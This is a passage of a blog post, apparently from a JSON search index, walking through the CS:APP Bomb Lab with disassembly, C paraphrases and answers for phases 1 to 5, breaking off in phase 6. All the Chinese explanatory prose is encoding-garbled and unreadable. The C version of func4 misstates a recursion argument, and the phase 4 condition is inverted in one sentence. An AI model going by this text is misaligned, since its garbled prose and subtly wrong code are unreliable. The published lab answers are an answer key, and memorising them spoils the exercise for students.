èŠã€‚ â€”â€”å­£ç¾¡æ— ã€Šæ¸…åå›­æ—¥è®°ã€‹","link":"/2021/06/25/quote-JiXianlin/"},{"title":"[csapp] Lab2 Bomb Lab","text":"Lab2 Bomb Lab1. Introductionç†Ÿæ‚‰GDBè°ƒè¯•å·¥å…·ï¼Œç†Ÿæ‚‰ objdump åæ±‡ç¼–ï¼Œç†Ÿæ‚‰æ±‡ç¼–ä»£ç é˜…è¯»ã€‚ 2. Puzzle2.1 Phase 1é¦–å…ˆä½¿ç”¨ objdump -d bomb è·å¾—bombæ–‡ä»¶çš„åç¼–è¯‘ä»£ç ã€‚å¯ä»¥åœ¨ 0000000000400da0 &lt;main&gt;:å‡½æ•°ä¸­æ‰¾åˆ° phase_1 çš„å‡½æ•°å…¥å£ã€‚ 1234400e32: e8 67 06 00 00 callq 40149e &lt;read_line&gt;400e37: 48 89 c7 mov %rax,%rdi400e3a: e8 a1 00 00 00 callq 400ee0 &lt;phase_1&gt;400e3f: e8 80 07 00 00 callq 4015c4 &lt;phase_defused&gt; è·³è½¬åˆ° phase_1 å‡½æ•° 1234567890000000000400ee0 &lt;phase_1&gt;: 400ee0: 48 83 ec 08 sub $0x8,%rsp 400ee4: be 00 24 40 00 mov $0x402400,%esi 400ee9: e8 4a 04 00 00 callq 401338 &lt;strings_not_equal&gt; 400eee: 85 c0 test %eax,%eax 400ef0: 74 05 je 400ef7 &lt;phase_1+0x17&gt; 400ef2: e8 43 05 00 00 callq 40143a &lt;explode_bomb&gt; 400ef7: 48 83 c4 08 add $0x8,%rsp 400efb: c3 retq è¿™æ®µä»£ç åªæ˜¯åœ¨æ¯”å¯¹ä¸¤ä¸ªå€¼ã€‚æˆ‘ä»¬å¯ä»¥çœ‹åˆ° $0x402400 è¢«ç§»åŠ¨åˆ°äº† %esi ä¸­ï¼Œå…¶å®æˆ‘ä»¬å·²ç»å¯ä»¥çŒœåˆ°è¿™ä¸ªå°±æ˜¯ç­”æ¡ˆï¼Œå†gdbä¸­æŸ¥çœ‹è¿™ä¸ªåœ°å€é‡Œé¢å­˜å‚¨çš„stringï¼Œå¾—åˆ° Border relations with Canada have never been better. ã€‚è‡³æ­¤ï¼Œç¬¬ä¸€ä¸ªpuzzleè§£é™¤ã€‚ æˆ‘ä»¬åœ¨è¿™é‡Œå†åˆ†æä¸€ä¸‹ callq 401338 &lt;strings_not_equal&gt; å‡½æ•°ã€‚ä¸‹é¢ä½¿ç”¨ -- è¡¨ç¤ºæ³¨é‡Š 1234567891011121314151617181920212223242526272829303132333435363738390000000000401338 &lt;strings_not_equal&gt;: ;-- input is(char* a, char*b) 401338: 41 54 push %r12; -- callee saved 40133a: 55 push %rbp; -- callee saved 40133b: 53 push %rbx; -- callee saved 40133c: 48 89 fb mov %rdi,%rbx; -- parameter1 type:char* 40133f: 48 89 f5 mov %rsi,%rbp; -- parameter2 type:char* 401342: e8 d4 ff ff ff callq 40131b &lt;string_length&gt; 401347: 41 89 c4 mov %eax,%r12d; --%r12d len(char* a) 40134a: 48 89 ef mov %rbp,%rdi 40134d: e8 c9 ff ff ff callq 40131b &lt;string_length&gt; 401352: ba 01 00 00 00 mov $0x1,%edx 401357: 41 39 c4 cmp %eax,%r12d --% last len is store in %eax 40135a: 75 3f jne 40139b &lt;strings_not_equal+0x63&gt; 40135c: 0f b6 03 movzbl (%rbx),%eax 40135f: 84 c0 test %al,%al 401361: 74 25 je 401388 &lt;strings_not_equal+0x50&gt; 401363: 3a 45 00 cmp 0x0(%rbp),%al 401366: 74 0a je 401372 &lt;strings_not_equal+0x3a&gt; 401368: eb 25 jmp 40138f &lt;strings_not_equal+0x57&gt; 40136a: 3a 45 00 cmp 0x0(%rbp),%al 40136d: 0f 1f 00 nopl (%rax) 401370: 75 24 jne 401396 &lt;strings_not_equal+0x5e&gt; 401372: 48 83 c3 01 add $0x1,%rbx 401376: 48 83 c5 01 add $0x1,%rbp 40137a: 0f b6 03 movzbl (%rbx),%eax 40137d: 84 c0 test %al,%al 40137f: 75 e9 jne 40136a &lt;strings_not_equal+0x32&gt;; --char loop 401381: ba 00 00 00 00 mov $0x0,%edx 401386: eb 13 jmp 40139b &lt;strings_not_equal+0x63&gt; 401388: ba 00 00 00 00 mov $0x0,%edx 40138d: eb 0c jmp 40139b &lt;strings_not_equal+0x63&gt; 40138f: ba 01 00 00 00 mov $0x1,%edx 401394: eb 05 jmp 40139b &lt;strings_not_equal+0x63&gt; 401396: ba 01 00 00 00 mov $0x1,%edx 40139b: 89 d0 mov %edx,%eax; -- return not eql is true 40139d: 5b pop %rbx 40139e: 5d pop %rbp 40139f: 41 5c pop %r12 4013a1: c3 retq æœ¬å‡½æ•°å…ˆæ˜¯åˆ¤æ–­ä¸¤ä¸ªå­—ç¬¦ä¸²çš„é•¿åº¦ï¼Œç„¶åå†é€å­—ç¬¦åˆ¤æ–­ï¼Œå¦‚æœä¸¤ä¸ªå­—ç¬¦ä¸²çš„é•¿åº¦ä¸ç›¸ç­‰ï¼Œæˆ–è€…å…¶ä¸­æœ‰å­—ç¬¦ä¸ç›¸ç­‰ï¼Œé‚£ä¹ˆè¿”å› true ï¼Œåä¹‹è¿”å› false ã€‚ 2.2 phase 2åŒç†ï¼Œæ‰¾åˆ° phase_2 çš„å‡½æ•°å…¥å£ 12345678910111213141516171819202122232425260000000000400efc &lt;phase_2&gt;: 400efc: 55 push %rbp 400efd: 53 push %rbx 400efe: 48 83 ec 28 sub $0x28,%rsp 400f02: 48 89 e6 mov %rsp,%rsi 400f05: e8 52 05 00 00 callq 40145c &lt;read_six_numbers&gt; 400f0a: 83 3c 24 01 cmpl $0x1,(%rsp) 400f0e: 74 20 je 400f30 &lt;phase_2+0x34&gt; 400f10: e8 25 05 00 00 callq 40143a &lt;explode_bomb&gt; 400f15: eb 19 jmp 400f30 &lt;phase_2+0x34&gt; 400f17: 8b 43 fc mov -0x4(%rbx),%eax 400f1a: 01 c0 add %eax,%eax 400f1c: 39 03 cmp %eax,(%rbx) 400f1e: 74 05 je 400f25 &lt;phase_2+0x29&gt; 400f20: e8 15 05 00 00 callq 40143a &lt;explode_bomb&gt; 400f25: 48 83 c3 04 add $0x4,%rbx 400f29: 48 39 eb cmp %rbp,%rbx 400f2c: 75 e9 jne 400f17 &lt;phase_2+0x1b&gt; 400f2e: eb 0c jmp 400f3c &lt;phase_2+0x40&gt; 400f30: 48 8d 5c 24 04 lea 0x4(%rsp),%rbx 400f35: 48 8d 6c 24 18 lea 0x18(%rsp),%rbp 400f3a: eb db jmp 400f17 &lt;phase_2+0x1b&gt; 400f3c: 48 83 c4 28 add $0x28,%rsp 400f40: 5b pop %rbx 400f41: 5d pop %rbp 400f42: c3 retq è¿™æ®µä»£ç å®é™…ä¸Šæ˜¯ä¸€ä¸ªéå¸¸ç®€å•çš„å¾ªç¯ã€‚å¯ä»¥çœ‹åˆ°åœ¨ callee-saved å‚æ•°åï¼Œç”³è¯·äº† 28 byteçš„å†…å­˜ã€‚ä¹‹åæŠŠæ ˆé¡¶çš„ %rsp mov to %rsi æ˜¯å› ä¸ºåœ¨ä¹‹å call çš„å‡½æ•°ä¸­åˆä¼šè¦†ç›–æ‰ %rsp ç°æœ‰çš„å‚æ•°ï¼Œæ‰€ä»¥å…ˆåšäº†å¤‡ä»½ï¼Œç„¶åè¿›å…¥äº† read_six_numberå‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°æ˜¾ç„¶æ˜¯è¯»å…¥6ä¸ªæ•°å­—ã€‚æˆ‘ä»¬è¿›å…¥åˆ°è¿™ä¸ªå‡½æ•°å…·ä½“çœ‹ã€‚ 123456789101112131415161718000000000040145c &lt;read_six_numbers&gt;: 40145c: 48 83 ec 18 sub $0x18,%rsp 401460: 48 89 f2 mov %rsi,%rdx 401463: 48 8d 4e 04 lea 0x4(%rsi),%rcx 401467: 48 8d 46 14 lea 0x14(%rsi),%rax 40146b: 48 89 44 24 08 mov %rax,0x8(%rsp) 401470: 48 8d 46 10 lea 0x10(%rsi),%rax 401474: 48 89 04 24 mov %rax,(%rsp) 401478: 4c 8d 4e 0c lea 0xc(%rsi),%r9 40147c: 4c 8d 46 08 lea 0x8(%rsi),%r8 401480: be c3 25 40 00 mov $0x4025c3,%esi 401485: b8 00 00 00 00 mov $0x0,%eax 40148a: e8 61 f7 ff ff callq 400bf0 &lt;__isoc99_sscanf@plt&gt; 40148f: 83 f8 05 cmp $0x5,%eax 401492: 7f 05 jg 401499 &lt;read_six_numbers+0x3d&gt; 401494: e8 a1 ff ff ff callq 40143a &lt;explode_bomb&gt; 401499: 48 83 c4 18 add $0x18,%rsp 40149d: c3 retq æˆ‘ä»¬é¦–å…ˆçœ‹åˆ°æœ‰ä¸€ä¸ª sscanf å‡½æ•°ï¼Œé‚£ä¹ˆæŒ‰ç…§æƒ¯ä¾‹ï¼Œå…¶ä¸Šçš„ %esi åº”è¯¥æ˜¯ä¼ å…¥è¿™ä¸ªå‡½æ•°çš„å‚æ•°ï¼Œåœ¨gdbä¸­æ‰“å°è¿™ä¸ªå‚æ•°çœ‹åˆ° &quot;%d %d %d %d %d %d&quot; æ˜¾ç„¶ã€‚ç„¶åæˆ‘ä»¬åˆ†æè¿™6ä¸ªæ•°å­—åœ¨ stack å’Œ register ä¸­æ˜¯æ€ä¹ˆå­˜å‚¨çš„ã€‚ é¦–å…ˆè¿™é‡Œçš„ %rsi æ˜¯ä» phase_2 è¿™ä¸ªå‡½æ•°ä¸­å¾—åˆ°çš„å‚æ•°ï¼Œå…¶å‚æ•°æ˜¯ phase_2 å‡½æ•°ä¸­ç”³è¯·åˆ°çš„ stack topã€‚ %rdx å­˜å‚¨çš„å®é™…ä¸Šæ˜¯ phase_2 çš„ stack topã€‚å­˜å‚¨çš„æ˜¯ç¬¬ä¸€ä¸ªå‚æ•° %rcx æ˜¯ stack top + 0x4ã€‚å­˜å‚¨ç¬¬äºŒä¸ªå‚æ•°ã€‚æ˜¾ç„¶è¿™é‡Œçš„å‚æ•°ç±»å‹æ˜¯ intã€‚ %r8 æ˜¯ stack top + 0x8ã€‚å­˜å‚¨ç¬¬ä¸‰ä¸ªå‚æ•°ã€‚ %r9 æ˜¯ stack top + 0xcã€‚å­˜å‚¨ç¬¬å››ä¸ªå‚æ•°ã€‚ ä¹‹åçš„ä¸¤ä¸ªå€¼éœ€è¦å‹æ ˆä¼ å‚ã€‚ stack top + 0x10ã€‚åœ¨ read_six_numbers å‡½æ•°ä¸­æ˜¯ %rsp ã€‚å­˜å‚¨ç¬¬äº”ä¸ªå‚æ•°ã€‚ stack top + 0x14ã€‚åœ¨ read_six_numbers å‡½æ•°ä¸­æ˜¯ %rsp + 0x8 ã€‚å­˜å‚¨ç¬¬äºŒä¸ªå‚æ•°ã€‚ å‡½æ•°ä¹‹åå†æ¥å—äº† sscanf çš„å‚æ•°ï¼Œå¾—åˆ°å‚æ•°æ•°é‡ï¼Œå¹¶ä½œæ¯”è¾ƒã€‚ å†çœ‹ phase_2 å‡½æ•°å°±éå¸¸ç®€å•äº†ï¼Œè½¬æ¢ä¸ºCè¯­è¨€è¡¨è¿°å¦‚ä¸‹ã€‚ 1234567if ((*rsp[0]) == 1){ for (int i = 0; i &lt; 5; i++){ if ((*rsp[i+1])!=(*rsp[i]*2)) explode_bomb(); }}else{ explode_bomb();} æ ¹æ®è¿™ä¸ªæ€è·¯ï¼Œå¾—åˆ°æœ€ç»ˆçš„ç»“æœä¸º 1,2,4,8,16,32 2.3 phase 3åŒç†ï¼Œæ‰¾åˆ° phase_3 çš„å‡½æ•°å…¥å£ 123456789101112131415161718192021222324252627282930313233343536370000000000400f43 &lt;phase_3&gt;: 400f43: 48 83 ec 18 sub $0x18,%rsp 400f47: 48 8d 4c 24 0c lea 0xc(%rsp),%rcx 400f4c: 48 8d 54 24 08 lea 0x8(%rsp),%rdx 400f51: be cf 25 40 00 mov $0x4025cf,%esi 400f56: b8 00 00 00 00 mov $0x0,%eax 400f5b: e8 90 fc ff ff callq 400bf0 &lt;__isoc99_sscanf@plt&gt; 400f60: 83 f8 01 cmp $0x1,%eax 400f63: 7f 05 jg 400f6a &lt;phase_3+0x27&gt; 400f65: e8 d0 04 00 00 callq 40143a &lt;explode_bomb&gt; 400f6a: 83 7c 24 08 07 cmpl $0x7,0x8(%rsp) 400f6f: 77 3c ja 400fad &lt;phase_3+0x6a&gt; 400f71: 8b 44 24 08 mov 0x8(%rsp),%eax 400f75: ff 24 c5 70 24 40 00 jmpq *0x402470(,%rax,8) 400f7c: b8 cf 00 00 00 mov $0xcf,%eax -- å½“ç¬¬ä¸€ä¸ªæ•°ä¸º0æ—¶è·³è½¬åˆ°æ­¤å¤„ 400f81: eb 3b jmp 400fbe &lt;phase_3+0x7b&gt; 400f83: b8 c3 02 00 00 mov $0x2c3,%eax -- å½“ç¬¬ä¸€ä¸ªæ•°ä¸º2æ—¶è·³è½¬åˆ°æ­¤å¤„ 400f88: eb 34 jmp 400fbe &lt;phase_3+0x7b&gt; 400f8a: b8 00 01 00 00 mov $0x100,%eax -- å½“ç¬¬ä¸€ä¸ªæ•°ä¸º3æ—¶è·³è½¬åˆ°æ­¤å¤„ 400f8f: eb 2d jmp 400fbe &lt;phase_3+0x7b&gt; 400f91: b8 85 01 00 00 mov $0x185,%eax -- å½“ç¬¬ä¸€ä¸ªæ•°ä¸º4æ—¶è·³è½¬åˆ°æ­¤å¤„ 400f96: eb 26 jmp 400fbe &lt;phase_3+0x7b&gt; 400f98: b8 ce 00 00 00 mov $0xce,%eax -- å½“ç¬¬ä¸€ä¸ªæ•°ä¸º5æ—¶è·³è½¬åˆ°æ­¤å¤„ 400f9d: eb 1f jmp 400fbe &lt;phase_3+0x7b&gt; 400f9f: b8 aa 02 00 00 mov $0x2aa,%eax -- å½“ç¬¬ä¸€ä¸ªæ•°ä¸º6æ—¶è·³è½¬åˆ°æ­¤å¤„ 400fa4: eb 18 jmp 400fbe &lt;phase_3+0x7b&gt; 400fa6: b8 47 01 00 00 mov $0x147,%eax 400fab: eb 11 jmp 400fbe &lt;phase_3+0x7b&gt; 400fad: e8 88 04 00 00 callq 40143a &lt;explode_bomb&gt; 400fb2: b8 00 00 00 00 mov $0x0,%eax 400fb7: eb 05 jmp 400fbe &lt;phase_3+0x7b&gt; 400fb9: b8 37 01 00 00 mov $0x137,%eax -- å½“ç¬¬ä¸€ä¸ªæ•°ä¸º1æ—¶è·³è½¬åˆ°æ­¤å¤„ 400fbe: 3b 44 24 0c cmp 0xc(%rsp),%eax 400fc2: 74 05 je 400fc9 &lt;phase_3+0x86&gt; 400fc4: e8 71 04 00 00 callq 40143a &lt;explode_bomb&gt; 400fc9: 48 83 c4 18 add $0x18,%rsp 400fcd: c3 retq é¦–å…ˆï¼Œæ ˆç”³è¯·äº† 18 byteã€‚ç›²çŒœç”¨ sscanf ä¼ å…¥äº†ä¸¤ä¸ª int ç±»å‹çš„å‚æ•°ï¼Œä½¿ç”¨ gdb æ‰“å° 0x4025cf ä½ç½®çš„å†…å­˜ï¼Œå¾—åˆ° &quot;%d %d&quot; ï¼Œæ­£ç¡®ã€‚æ¥ä¸‹æ¥åšäº†ä¸€ä¸ªåˆ¤æ–­ï¼Œåˆ¤æ–­ä¼ è¿›æ¥çš„å‚æ•°é‡ã€‚ç„¶ååˆ¤æ–­äº†ä¼ è¿›æ¥çš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯å¦å°äº7ï¼Œè·³è½¬è·³è½¬åˆ°0x402470+8*%eaxåœ°å€æ‰€å­˜å‚¨çš„åœ°å€ã€‚å‘ç° %eax ä¸è¾“å…¥æœ‰å…³ã€‚æ¯”å¦‚æˆ‘ç°åœ¨çš„ %rax æ˜¯ 0ï¼Œé‚£ä¹ˆè·³è½¬çš„åœ°å€å°±æ˜¯ 0x402470 ä¸­å­˜å‚¨çš„å€¼ 0xf7cï¼ŒæŠŠ 0xcf å†™å…¥åˆ° %eax ä¸­è¿›è¡Œæ¯”è¾ƒã€‚è¿™é‡Œæœ‰å¤šä¸ªç­”æ¡ˆï¼Œç¬¬ä¸€ä¸ªæ•°ä»0â†’6éƒ½è¡Œï¼Œåé¢çš„æ•°æŒ‰ç…§è¿™ä¸ªè·³è½¬è¡¨æ¥å°±è¡Œã€‚ 2.4 phase 4åŒç†ï¼Œæ‰¾åˆ° phase_4 çš„å‡½æ•°å…¥å£ 1234567891011121314151617181920212223000000000040100c &lt;phase_4&gt;: 40100c: 48 83 ec 18 sub $0x18,%rsp 401010: 48 8d 4c 24 0c lea 0xc(%rsp),%rcx 401015: 48 8d 54 24 08 lea 0x8(%rsp),%rdx 40101a: be cf 25 40 00 mov $0x4025cf,%esi 40101f: b8 00 00 00 00 mov $0x0,%eax 401024: e8 c7 fb ff ff callq 400bf0 &lt;__isoc99_sscanf@plt&gt; 401029: 83 f8 02 cmp $0x2,%eax 40102c: 75 07 jne 401035 &lt;phase_4+0x29&gt; 40102e: 83 7c 24 08 0e cmpl $0xe,0x8(%rsp) 401033: 76 05 jbe 40103a &lt;phase_4+0x2e&gt; 401035: e8 00 04 00 00 callq 40143a &lt;explode_bomb&gt; 40103a: ba 0e 00 00 00 mov $0xe,%edx 40103f: be 00 00 00 00 mov $0x0,%esi 401044: 8b 7c 24 08 mov 0x8(%rsp),%edi 401048: e8 81 ff ff ff callq 400fce &lt;func4&gt; 40104d: 85 c0 test %eax,%eax 40104f: 75 07 jne 401058 &lt;phase_4+0x4c&gt; 401051: 83 7c 24 0c 00 cmpl $0x0,0xc(%rsp) 401056: 74 05 je 40105d &lt;phase_4+0x51&gt; 401058: e8 dd 03 00 00 callq 40143a &lt;explode_bomb&gt; 40105d: 48 83 c4 18 add $0x18,%rsp 401061: c3 retq sscanf è¯»å…¥äº† %d %d åˆ° %rdx %rcx ï¼Œå‡è®¾è¯»å…¥çš„ä¸¤ä¸ªå‚æ•°æ˜¯ a,b ã€‚ ç”¨cè¯­è¨€æè¿°è¿™ä¸ªå‡½æ•°å°±æ˜¯: 12345678910111213int phase_4(){ int a, b; int c = sscanf(&quot;%d %d&quot;, &amp;a, &amp;b); if (c != 2){explode_bomb();} if (a &lt;= 0xe){ int fans = func4(a, 0x0, 0xe); if (fans != 0 || b != 0){ explode_bomb(); } }else { explode_bomb(); }} è¯´æ˜ fans å’Œ è¾“å…¥çš„ b éƒ½å¿…é¡»æ˜¯ 0ã€‚å¦‚æœ 14 â‰¤ aï¼Œè·³è½¬åˆ° func4 ï¼Œ func4 çš„å…¥å£ï¼š 12345678910111213141516171819202122230000000000400fce &lt;func4&gt;: 400fce: 48 83 ec 08 sub $0x8,%rsp 400fd2: 89 d0 mov %edx,%eax 400fd4: 29 f0 sub %esi,%eax 400fd6: 89 c1 mov %eax,%ecx 400fd8: c1 e9 1f shr $0x1f,%ecx 400fdb: 01 c8 add %ecx,%eax 400fdd: d1 f8 sar %eax 400fdf: 8d 0c 30 lea (%rax,%rsi,1),%ecx 400fe2: 39 f9 cmp %edi,%ecx 400fe4: 7e 0c jle 400ff2 &lt;func4+0x24&gt; 400fe6: 8d 51 ff lea -0x1(%rcx),%edx 400fe9: e8 e0 ff ff ff callq 400fce &lt;func4&gt; 400fee: 01 c0 add %eax,%eax 400ff0: eb 15 jmp 401007 &lt;func4+0x39&gt; 400ff2: b8 00 00 00 00 mov $0x0,%eax 400ff7: 39 f9 cmp %edi,%ecx 400ff9: 7d 0c jge 401007 &lt;func4+0x39&gt; 400ffb: 8d 71 01 lea 0x1(%rcx),%esi 400ffe: e8 cb ff ff ff callq 400fce &lt;func4&gt; 401003: 8d 44 00 01 lea 0x1(%rax,%rax,1),%eax 401007: 48 83 c4 08 add $0x8,%rsp 40100b: c3 retq ç”¨cè¯­è¨€æè¿° func4 12345678910111213141516171819202122232425// edi-&gt;a, esi-&gt;b, edx-&gt;c// the rules of X86-64 conventional set %rdi, %rsi, %rdx as 1-&gt;3 parameters' register.int func4(int a, int b, int c){ int ans = c - b; int tmp = ans &gt;&gt; 31; // tmp is register %ecx in func4. ans = (tmp + ans) &gt;&gt; 1; tmp = ans + b; if (a &gt;= tmp){ ans = 0; if (a &lt;= tmp){ return ans; } else{ b = c + 1; ans = func4(a, b, c); ans = 2 * ans + 1; return ans; } } else{ c = tmp - 1; ans = func4(a, b, c); return ans * 2; }} ä¸ºäº†è®©è¾“å‡ºæ˜¯ 0 ï¼Œå½“ tmp = a æ—¶è¿”å›çš„ ans=0 ï¼Œå› ä¸º b = 0x0ï¼Œc = 0xeï¼Œtmp = 7 = ans æ‰€ä»¥æœ€ç»ˆçš„ç­”æ¡ˆæ˜¯ 0 7 2.5 phase 512345678910111213141516171819202122232425262728293031323334353637383940410000000000401062 &lt;phase_5&gt;: 401062: 53 push %rbx 401063: 48 83 ec 20 sub $0x20,%rsp // stack frame depth 0x20 byte 401067: 48 89 fb mov %rdi,%rbx // A parameter load in, string address 40106a: 64 48 8b 04 25 28 00 mov %fs:0x28,%rax // canary of stack; 401071: 00 00 401073: 48 89 44 24 18 mov %rax,0x18(%rsp) // canary store. 401078: 31 c0 xor %eax,%eax 40107a: e8 9c 02 00 00 callq 40131b &lt;string_length&gt; // string address is %rbx 40107f: 83 f8 06 cmp $0x6,%eax // find string length must be 6; 401082: 74 4e je 4010d2 &lt;phase_5+0x70&gt; 401084: e8 b1 03 00 00 callq 40143a &lt;explode_bomb&gt; 401089: eb 47 jmp 4010d2 &lt;phase_5+0x70&gt; 40108b: 0f b6 0c 03 movzbl (%rbx,%rax,1),%ecx // get single character 40108f: 88 0c 24 mov %cl,(%rsp) 401092: 48 8b 14 24 mov (%rsp),%rdx // move single character to rdx 401096: 83 e2 0f and $0xf,%edx // get lower-bits of %rdx 401099: 0f b6 92 b0 24 40 00 movzbl 0x4024b0(%rdx),%edx 4010a0: 88 54 04 10 mov %dl,0x10(%rsp,%rax,1) 4010a4: 48 83 c0 01 add $0x1,%rax 4010a8: 48 83 f8 06 cmp $0x6,%rax // loop 6 times. 4010ac: 75 dd jne 40108b &lt;phase_5+0x29&gt; 4010ae: c6 44 24 16 00 movb $0x0,0x16(%rsp) // last '\\0' in string. 4010b3: be 5e 24 40 00 mov $0x40245e,%esi // compare string %esi and %rdi 4010b8: 48 8d 7c 24 10 lea 0x10(%rsp),%rdi // compare string %esi and %rdi 4010bd: e8 76 02 00 00 callq 401338 &lt;strings_not_equal&gt; 4010c2: 85 c0 test %eax,%eax 4010c4: 74 13 je 4010d9 &lt;phase_5+0x77&gt; 4010c6: e8 6f 03 00 00 callq 40143a &lt;explode_bomb&gt; 4010cb: 0f 1f 44 00 00 nopl 0x0(%rax,%rax,1) 4010d0: eb 07 jmp 4010d9 &lt;phase_5+0x77&gt; 4010d2: b8 00 00 00 00 mov $0x0,%eax // set ans = 0; 4010d7: eb b2 jmp 40108b &lt;phase_5+0x29&gt; 4010d9: 48 8b 44 24 18 mov 0x18(%rsp),%rax 4010de: 64 48 33 04 25 28 00 xor %fs:0x28,%rax 4010e5: 00 00 4010e7: 74 05 je 4010ee &lt;phase_5+0x8c&gt; 4010e9: e8 42 fa ff ff callq 400b30 &lt;__stack_chk_fail@plt&gt; // stack canary 4010ee: 48 83 c4 20 add $0x20,%rsp 4010f2: 5b pop %rbx 4010f3: c3 retq gdb æ‰“å° 0x4024b0 å¤„çš„å­—ç¬¦ä¸²ï¼Œå¾—åˆ° maduiersnfotvbylSo you think you can stop the bomb with ctrl-c, do you? æ‰“å°ä½äº 0x40245e å¤„çš„å­—ç¬¦ä¸²ï¼Œå¾—åˆ° &quot;flyers&quot; ã€‚æ˜¾ç„¶æœ€åçš„ç»“æœéœ€è¦ä¸è¿™ä¸ªä½œæ¯”è¾ƒã€‚å¦‚ä»£ç ä¸­çš„æ³¨é‡Šæ˜¾ç¤ºï¼Œè¿™é‡Œåšçš„æ“ä½œå°±æ˜¯è¯»å–æˆ‘è¾“å…¥çš„å­—ç¬¦ä¸²çš„æ¯ä¸ªå­—ç¬¦ï¼Œç„¶åæŠŠè¿™ä¸ªå­—ç¬¦çš„å4ä¸ªbitå–å‡ºæ¥ä½œä¸º offsite åœ¨ 0x4024b0 å¤„çš„å­—ç¬¦ä¸²ä¸­æ‰¾åˆ°ç›¸åº”çš„å­—ç¬¦ã€‚ 2.6 phase 6 loop &amp; linked-list1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878800000000004010f4 &lt;phase_6&gt;: 4010f4: 41 56 push %r14 4010f6: 41 55 push %r13 4010f8: 41 54 push %r12 4010fa: 55 push %rbp 4010fb: 53 push %rbx 4010fc: 48 83 ec 50 sub $0x50,%rsp // stack init 401100: 49 89 e5 mov %rsp,%r13 401103: 48 89 e6 mov %rsp,%rsi 401106: e8 51 03 00 00 callq 40145c &lt;read_six_numbers&gt; // read six value 40110b: 49 89 e6 mov %rsp,%r14 40110e: 41 bc 00 00 00 00 mov $0x0,%r12d 401114: 4c 89 ed mov %r13,%rbp 401117: 41 8b 45 00 mov 0x0(%r13),%eax 40111b: 83 e8 01 sub $0x1,%eax 40111e: 83 f8 05 cmp $0x5,%eax 401121: 76 05 jbe 401128 &lt;phase_6+0x34&gt; 401123: e8 12 03 00 00 callq 40143a &lt;explode_bomb&gt; 401128: 41 83 c4 01 add $0x1,%r12d 40112c: 41 83 fc 06 cmp $0x6,%r12d 401130: 74 21 je 401153 &lt;phase_6+0x5f&gt; 401132: 44 89 e3 mov %r12d,%ebx 401135: 48 63 c3 movslq %ebx,%rax 401138: 8b 04 84 mov (%rsp,%rax,4),%eax 40113b: 39 45 00 cmp %eax,0x0(%rbp) 40113e: 75 05 jne 401145 &lt;phase_6+0x51&gt; 401140: e8 f5 02 00 00 callq 40143a &lt;explode_bomb&gt; 401145: 83 c3 01 add $0x1,%ebx 401148: 83 fb 05 cmp $0x5,%ebx 40114b: 7e e8 jle 401135 &lt;phase_6+0x41&gt; 40114d: 49 83 c5 04 add $0x4,%r13 401151: eb c1 jmp 401114 &lt;phase_6+0x20&gt; 401153: 48 8d 74 24 18 lea 0x18(%rsp),%rsi 401158: 4c 89 f0 mov %r14,%rax 40115b: b9 07 00 00 00 mov $0x7,%ecx 401160: 89 ca mov %ecx,%edx 401162: 2b 10 sub (%rax),%edx 401164: 89 10 mov %edx,(%rax) 401166: 48 83 c0 04 add $0x4,%rax 40116a: 48 39 f0 cmp %rsi,%rax 40116d: 75 f1 jne 401160 &lt;phase_6+0x6c&gt; 40116f: be 00 00 00 00 mov $0x0,%esi 401174: eb 21 jmp 401197 &lt;phase_6+0xa3&gt; 401176: 48 8b 52 08 mov 0x8(%rdx),%rdx 40117a: 83 c0 01 add $0x1,%eax 40117d: 39 c8 cmp %ecx,%eax 40117f: 75 f5 jne 401176 &lt;phase_6+0x82&gt; 401181: eb 05 jmp 401188 &lt;phase_6+0x94&gt; 401183: ba d0 32 60 00 mov $0x6032d0,%edx 401188: 48 89 54 74 20 mov %rdx,0x20(%rsp,%rsi,2) 40118d: 48 83 c6 04 add $0x4,%rsi 401191: 48 83 fe 18 cmp $0x18,%rsi 401195: 74 14 je 4011ab &lt;phase_6+0xb7&gt; 401197: 8b 0c 34 mov (%rsp,%rsi,1),%ecx 40119a: 83 f9 01 cmp $0x1,%ecx 40119d: 7e e4 jle 401183 &lt;phase_6+0x8f&gt; 40119f: b8 01 00 00 00 mov $0x1,%eax 4011a4: ba d0 32 60 00 mov $0x6032d0,%edx 4011a9: eb cb jmp 401176 &lt;phase_6+0x82&gt; 4011ab: 48 8b 5c 24 20 mov 0x20(%rsp),%rbx 4011b0: 48 8d 44 24 28 lea 0x28(%rsp),%rax 4011b5: 48 8d 74 24 50 lea 0x50(%rsp),%rsi 4011ba: 48 89 d9 mov %rbx,%rcx 4011bd: 48 8b 10 mov (%rax),%rdx 4011c0: 48 89 51 08 mov %rdx,0x8(%rcx) 4011c4: 48 83 c0 08 add $0x8,%rax 4011c8: 48 39 f0 cmp %rsi,%rax 4011cb: 74 05 je 4011d2 &lt;phase_6+0xde&gt; 4011cd: 48 89 d1 mov %rdx,%rcx 4011d0: eb eb jmp 4011bd &lt;phase_6+0xc9&gt; 4011d2: 48 c7 42 08 00 00 00 movq $0x0,0x8(%rdx) 4011d9: 00 4011da: bd 05 00 00 00 mov $0x5,%ebp 4011df: 48 8b 43 08 mov 0x8(%rbx),%rax 4011e3: 8b 00 mov (%rax),%eax 4011e5: 39 03 cmp %eax,(%rbx) 4011e7: 7d 05 jge 4011ee &lt;phase_6+0xfa&gt; 4011e9: e8 4c 02 00 00 callq 40143a &lt;explode_bomb&gt; 4011ee: 48 8b 5b 08 mov 0x8(%rbx),%rbx 4011f2: 83 ed 01 sub $0x1,%ebp 4011f5: 75 e8 jne 4011df &lt;phase_6+0xeb&gt; 4011f7: 48 83 c4 50 add $0x50,%rsp 4011fb: 5b pop %rbx 4011fc: 5d pop %rbp 4011fd: 41 5c pop %r12 4011ff: 41 5d pop %r13 401201: 41 5e pop %r14 401203: c3 retq é¦–å…ˆè¯»å…¥äº†6ä¸ªæ•°å­—ï¼Œåˆ†åˆ«æ”¾å…¥äº†%rsp+0x0ã€%rsp+0x4ã€%rsp+0x8ã€%rsp+0xcã€%rsp+0x10ã€%rsp+0x14 